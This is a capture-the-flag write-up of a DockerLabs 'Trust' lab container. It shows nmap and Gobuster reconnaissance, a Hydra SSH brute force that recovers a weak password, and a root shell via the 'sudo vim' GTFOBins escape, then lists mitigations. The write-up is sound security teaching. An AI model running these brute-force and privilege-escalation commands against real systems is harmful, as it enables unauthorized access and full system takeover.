# 🐳 DockerLabs - Trust (Very Easy)

## 🎯 Objective
Compromise the target machine and obtain **root access** following a standard penetration testing methodology.

---

## 🔍 Recognition  

### Initial scan
```bash
nmap -p- -T4 -Pn -sV 172.18.0.2
```
#### Result:
<img width="773" height="240" alt="image" src="https://github.com/user-attachments/assets/40ea181b-8279-4b98-85b2-af675c8cc5be" />

## 📂 Directory Fuzzing

Next, we perform directory enumeration using **Gobuster** to discover hidden endpoints on the web server. We use the `common.txt` wordlist to brute-force possible directories and files.

### Command used
```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
#### Result:
<img width="767" height="611" alt="image" src="https://github.com/user-attachments/assets/67877336-231d-43cd-ba0d-d376244d4a15" />

## 🔎 Discovery of Hidden Endpoint

Using the **Gobuster** tool, we discovered a `.php` file named `secret` with an HTTP status code **200 (OK)**, indicating that the resource is accessible.

### Open in Navigator
```bash
http://172.18.0.2/secret.php
```
#### Result:
<img width="956" height="1038" alt="image" src="https://github.com/user-attachments/assets/8a9a1c9e-a86e-4357-bdc9-6c5944d8b0b5" />

## 🔐 Brute Force Attack (SSH)

In this case, we observe that the web message references a username: **Mario**.  
This suggests a potential valid user account on the system.

Since the **SSH service (port 22)** is open, we attempt a **brute-force attack** using this username.

---

### 📌 Wordlist Setup tool
https://weakpass.com/wordlists/rockyou.txt
Save it into path: /usr/share/dict/rockyou.txt

```bash
hydra -l mario -P /usr/share/dict/rockyou.txt ssh://172.18.0.2 -t 4
```
#### Result:
<img width="940" height="194" alt="image" src="https://github.com/user-attachments/assets/8e69816d-9aa9-45b5-b54e-8b26c12bdbdb" />

#### 🧾 Explanation
-l mario → Target username
-P → Password wordlist
ssh:// → Target service
-t 4 → Number of parallel tasks

#### 🎯 Objective
Discover valid SSH credentials
Gain initial access to the system
```bash
login: mario
password: chocolate
```

## 💻 SSH Access

After obtaining valid credentials, we proceed to connect to the target system via **SSH**.

### Command used
```bash
ssh mario@172.18.0.2
```
#### Result:
<img width="813" height="229" alt="image" src="https://github.com/user-attachments/assets/bc397e24-d9a2-4a94-8153-5f262fe4a1b3" />

## 🚀 Privilege Escalation

After gaining access as user `mario`, we proceed with internal enumeration to identify potential privilege escalation vectors.

---

### 🔍 Checking sudo permissions

```bash
sudo -l
```
#### Result:
<img width="941" height="139" alt="image" src="https://github.com/user-attachments/assets/be49000c-c4e1-4e2f-9215-4e5464a6dda9" />

## 🧠 Analysis
This represents a critical misconfiguration, as vim is a text editor that allows execution of operating system commands directly from its interface using the internal :! command.

## 📚 Reference: GTFOBins

We consult GTFOBins, a well-known resource for privilege escalation techniques involving Unix binaries:

🔗 https://gtfobins.github.io/gtfobins/vim/#sudo

The sudo section for vim provides a direct method to spawn a root shell.

## 💣 Exploitation
🧾 Command Breakdown

sudo vim     → Runs vim with root privileges

-c           → Executes a command upon startup

':!/bin/sh'  → Uses vim’s internal :! to execute /bin/sh as root


```bash
sudo vim -c ':!/bin/sh'
```
### 🧬 Post-Exploitation
Bash:
```bash
whoami
```
```bash
id 
```
```bash
hostname  
```
#### Result:
<img width="429" height="157" alt="image" src="https://github.com/user-attachments/assets/c69b5f21-37a8-4f72-b19e-5cb1ff23d108" />

## 💥 Impact

- Unauthorized SSH access due to weak credentials  
- Privilege escalation via misconfigured sudo permissions (`vim`)  
- Full system compromise (root access)  
- Potential data exposure, persistence, and lateral movement  

---

## 🛡️ Mitigation

- Enforce strong passwords and disable SSH password authentication (use keys)  
- Apply least privilege principle in sudo configurations  
- Avoid allowing interactive binaries (e.g., `vim`) with sudo  
- Monitor and limit failed login attempts  

---

## 🏁 Conclusion

This lab shows how weak credentials and improper sudo configuration can lead to full system compromise.  
Following basic security best practices would prevent this attack.
